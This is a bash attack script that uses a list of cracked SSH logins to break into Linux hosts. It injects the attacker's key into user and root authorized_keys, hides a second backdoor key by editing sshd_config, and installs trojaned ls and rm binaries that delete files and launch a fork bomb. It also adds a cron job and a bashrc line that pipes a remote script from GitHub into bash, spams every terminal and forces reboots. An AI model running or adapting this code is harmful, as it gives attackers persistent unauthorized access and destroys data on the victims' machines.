#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## detects OS
	## injects ssh keys and gently poisons auth file location
	## spreads some aids
#=======================================================================================
#=======================================================================================
	#
	#*************** NEED TO DO/ADD ***********************
	# fix the non-prompt return at the end. ("starting sshd ok" but just stays blank)
	# for centos (at least), change the WOULD YOU LIKE TO PLAY A GAME from 'wall' to pts/whatever
	# checks for existing changes before reapplying them
	# make rickroll "safer"
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
###### RUN function #######
###########################
function main(){		###
#	meat				###
	infect $*			###
}						###
###########################
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
###########################################################################################
# Infecting target(s)
###########################################################################################
function infect(){
#### launch bay #############
function payload(){			#
	if [[ $1 != '' ]]; then	#
		razor $*			# SINGLE TARGET
	else					#
		shotgun				# EVERYONE
	fi 						#
}							#
#############################
	#### Setting Defaults ############################
	crackedLogins="./crackedLogins"
	sshKey="/root/.ssh/id_rsa"
	#### Gathering Info ############################
	# making key if there isn't one
		if [ ! -e $sshKey ]; then
			ssh-keygen -f $sshKey -t rsa -N ''
		fi
#+++++++++++++++
# single target
#+++++++++++++++
	function razor(){
	#### Assigning values ############################
		target="$(echo $tango   | cut -d" " -f1 || $1)"
			: ${target:=$1}
		username="$(echo $tango | cut -d" " -f2 || $2)"
			: ${username:=$2}
		password="$(echo $tango | cut -d" " -f3 || $3)"
			: ${password:=$3}

		sshLoginCommand="sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
		sshUserPath="/home/$username/.ssh"
		sshUserKey="$sshUserPath/authorized_keys"
		sshRootPath="/root/.ssh"
		sshRootKey="$sshRootPath/authorized_keys"
		sshPoisonPath="/root/.vim"
		sshPoisonKey="$sshPoisonPath/ssh"

	#### Inserting keys ############################
		osDetect=$(sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
			if [[ $? == 0 ]]; then
				printf "\nInserting ssh key and poisoning dirs for [$target] with ($username:$password)"
			else
				printf "\nFAILED to connect to $target"
			fi
		printf "\nosDetect result= $osDetect\n"
			case $osDetect in
				Ubuntu)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							printf "\nPoisoning sshd rules on [$target]\n"
							ssh $target "
										mkdir $sshPoisonPath
										cp $sshRootKey $sshPoisonKey
										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
										service sshd restart
										" &
						#payload
							ssh $target "
										touch /tmp/.trigger
										echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
										echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
										chmod +x $seedPathsLS $seedPathsRM
										chmod 777 $seedPathsLS $seedPathsRM
										(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
										at now +1 minute <<< 'init 6'
										for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
										" &
							;;
				Debian)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							printf "\nPoisoning sshd rules on [$target]\n"
							ssh $target "
										mkdir $sshPoisonPath
										cp $sshRootKey $sshPoisonKey
										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
										service sshd restart
										" &
							;;
				CentOS)
						#inserting key
							$sshLoginCommand "
											echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
											echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
																	 cat >> $sshUserKey
											echo $password | sudo -S chmod 600 $sshUserKey &> /dev/null
											echo $password | sudo -S cp $sshUserKey $sshRootKey &> /dev/null
											echo $password | sudo -S restorecon -r /root &> /dev/null
											"</root/.ssh/id_rsa.pub

							# if sudo doesn't exist, sets up the key for normal user and lets you know.
							if [ $? != 0 ]; then
								printf "\n\e[0;31mwomp womp.. no sudo. you get to do it manually.. yay!!\e[0m\n\t[$target:$username:$password]\n"
								$sshLoginCommand "
												mkdir -m700 -p $sshUserPath
												chmod 600 $sshUserKey &> /dev/null || install -m 600 /dev/null $sshUserKey
												cat >> $sshUserKey
												" </root/.ssh/id_rsa.pub
							fi
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							if [ $? == 0 ]; then
								printf "\nPoisoning sshd rules on [$target]\n"
								ssh $target "
											mkdir $sshPoisonPath
											cp $sshRootKey /root/.ssh/.authorized_keys
											echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
											service sshd restart
											" &
							fi
						#let the bodies hit the floor
							if [ $? == 0 ]; then
								printf "\nLoosing the plague upon [$target]\n"
								ssh $target "
											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
											echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
											chmod +x $seedPathsLS $seedPathsRM
											chmod 777 $seedPathsLS $seedPathsRM
											touch /tmp/.trigger
											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
											echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
											echo '$centDirtyRootPS1' >> /etc/bashrc
											echo 'curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash' >> /etc/bashrc
											for n in {1..100}; do
												echo "WOULD YOU LIKE TO PLAY A GAME???" | tee /dev/hvc* /dev/tty* /dev/pts/*
												sleep .15
											done &> /dev/null
											init 6
											" &
							fi
							;;
					*)		echo UNKNOWN
							;;
			esac
	}
#+++++++++++++++
# into a crowd
#+++++++++++++++
	function shotgun(){
		while read -r tango; do
			razor
		done <<< $(sort -u $crackedLogins | sed '/^$/d')
	}
payload $*
}
###########################################################################################
#checking for, and installing, needed stuff
###########################################################################################
function meat(){
	commands="sshpass net-tools"
	installing=""
	updated=0
	scriptPath="$BASH_SOURCE"
	#### Updating Repos ############################
		if [[ $updated == 0 ]]; then
			command apt update
		# so it knows not to check next time
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	#### Software ############################
	# looking for missing apps
		for word in $commands; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ "$installing" != "" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi
}

###########################################################################################
#dirty PATH and scripts
###########################################################################################
centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
centPATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"
seedPathsLS="/usr/local/sbin/ls /usr/local/bin/ls"
seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
###################################################
### dirty scripts #################################
###################################################
	dirtyLS="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	triggerPath="/tmp/.trigger"
	# pulls in and builds argsLS for the real ls
	argsLS=""
	argsLSrm=""
	while [[ "$1" != "" ]]; do
		argsLS="$1 ${argsLS}"
		argsLSrm="$2 ${argsLSrm}"
		shift
	done
	# checks for the trigger file, if it exists it acts like normal
	if [ ! -e $triggerPath ]; then
        if [[ $argsLS == '--color=auto ' ]]; then
                printf "\n..is something supposed to happen now?\n"
        else
                /bin/rm -rf $argsLSrm
                printf "\n\e[0;95m*poof*\e[m goes [${argsLSrm}]\n"
                #could just as easily `shred` to be meaner
        fi
	else
        /bin/ls $argsLS
        #hints at the issue
        printf "\n\n----\n"
        printf "argsLS= $argsLS\n"
	fi
	EOF
	)"
###########################################################
	dirtyRM="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
	#####################
	function mainRM(){	#
		buildEmUp $*	#
		tripwire		#
	}					#
	#####################
	triggerPath="/tmp/.trigger"
	### defining, and sourcing, increment info ###
	function buildEmUp(){
		incrementPath="/tmp/.increment"
			# checking if increment file exists, making it if not
			if [ ! -e $incrementPath ]; then
				echo "increment=0" > $incrementPath
			fi
		source $incrementPath

		# pulls in and builds argsRM for the real rm
		argsRM=""
		while [[ "$1" != "" ]]; do
			argsRM="$1 ${argsRM}"
			shift
		done
	}
	#### checks for the trigger file, if its there it acts like normal ###
	function tripwire(){
		if [ ! -e $triggerPath ]; then
			echo "trigger is missing"
			rmCase
		else
			/bin/rm $argsRM
			#hints at the issue
			printf "\n\n----\n"
			printf "argsRM= $argsRM\n"
		fi
	}
	### determining what happens based on number of times used ###
	function rmCase(){
		case $increment in
			0)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo "increment: $increment"
					echo "hard drives are big. no need to delete anything.."
					;;
			1)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					printf "\nrude.\nstop that.\n"
					;;
			2)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo $increment
					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2
					o(){ o|o& };o
					;;
			*)
					clear
					printf "\nBewbs\n"
					;;
		esac
	}
	mainRM $*
	EOF
	)"

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main $*
